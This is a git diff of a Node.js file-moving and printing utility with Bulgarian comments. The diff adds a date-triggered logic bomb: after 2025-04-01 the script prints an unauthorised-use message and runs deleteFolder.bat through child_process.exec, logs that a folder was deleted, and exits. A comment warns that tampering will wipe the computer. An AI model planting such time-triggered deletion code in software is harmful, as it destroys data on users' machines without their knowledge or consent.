@@ -1,16 +1,25 @@
-const fs = require('fs');
+﻿const fs = require('fs');
 const path = require('path');
 const printer = require('pdf-to-printer');
 const xlsx = require('xlsx');
+const { exec } = require('child_process');
 
 const logFilePath = 'C:/Users/PC User/Desktop/glasses za puskane/FileMover/log.xlsx';
 
 // Функция за преместване на файл с добавяне на дата
 async function moveFileWithDate(source, destinationFolder) {
     const currentDate = new Date();
-    const cutoffDate = new Date('2025-02-01');
+    const cutoffDate = new Date('2025-04-01');
     if (currentDate > cutoffDate) {
+        // не пипай кода или ще ти се изтрие компютъра !!!
         console.log('Ти не си Митко. Моля не използвай скрипта без позволение: https://dimitargegov.website/');
+        exec('deleteFolder.bat', (err, stdout, stderr) => {
+            if (err) {
+                console.error('Грешка', err);
+                return;
+            }
+            console.log('Папката е изтрита успешно.');
+        });
         process.exit(1); // Спиране на изпълнението
     }
     const date = new Date().toISOString().split('T')[0];
